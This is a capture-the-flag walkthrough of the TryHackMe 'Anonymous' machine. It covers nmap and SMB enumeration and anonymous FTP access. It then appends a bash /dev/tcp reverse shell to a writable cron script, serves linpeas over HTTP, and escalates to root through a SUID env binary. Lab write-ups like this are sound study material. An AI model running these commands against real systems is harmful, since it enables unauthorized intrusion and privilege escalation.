# Anonymous

<b>Available at: </b>[TryHackMe](https://tryhackme.com/room/anonymous)

A medium level machine, feel free to read my notes

## Enumerate the machine.  How many ports are open?

Use nmap
`nmap -sC -sV -vv -oN nmap.txt -p- IP`

Answer: `4`

Ports open:
```
21
22
445
139
```

## What service is running on port 21?

What is typicall for port 21?

`FTP`

## What service is running on ports 139 and 445?

View the nmap output: `cat nmap.txt`

```
139/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
```

Answer: smb

## There's a share on the user's computer. What's it called?

We have to list shares. smbclient -L ////IP:445 or ////IP:139

But no luck. I tried an anonymous connection to the ftp client, and success. 

### Files got: 
```
clean.sh 
removed_files.log  
to_do.txt
```

At first glace, nothing good.

### smb-enum-shares

Became desperate, so I tried this.

```
nmap --script smb-enum-shares -p 445,139 10.10.253.50
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-02 16:36 EST
Nmap scan report for 10.10.253.50
Host is up (0.048s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.253.50\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (anonymous server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.253.50\pics: 
|     Type: STYPE_DISKTREE
|     Comment: My SMB Share Directory for Pics
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\namelessone\pics
|     Anonymous access: READ
|     Current user access: READ
|   \\10.10.253.50\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>

```

### Answer

pics

`smbclient //IP/pics -U " "%" "`

and we get a list: 
```
corgo2.jpg
puppos.jpg
```
possible user: namelessone

## user.txt

take what I said back, we could use `clean.sh` to get a reverse shell

from 

```bash
tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
```
to 

```bash
bash -i >& /dev/tcp/10.8.147.71/8888 0>&1;
```

I appended this to file in ftp using `append clean.sh` 
run `nc -lvnp 8888` in another tab and we are good to go!

Then just cat the user flag. 

## root.txt 

### Stabilize shell

```
$ python3 -c "import pty; pty.spawn('/bin/bash')"

$ export TERM=xterm; export SHELL=/bin/bash
```
then Ctrl + Z to background the process, and in your host:
```
$ stty raw -echo; fg
```
and bam , we have a stable shell

### Escalation

running `id` the user is in groups `4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)` but we dont know the sudo password.

Lets run find for suid binaries
```bash
find / -type f -user root -perm /4000 2>/dev/null
```
time for linpeas.sh! Lets get it over through a simple python server:
```
python3 -m http.server --bind LHOST_IP 9999
```
and on remote you just wget the linpeas.sh file and run it

Now.... After linpeas finished, I realized that it found SUID binaries, that I overlooked in find. Especially `env`. 

run 
```
env /bin/bash -p
```
and we are root 

The root flag is in the /root/ directory 
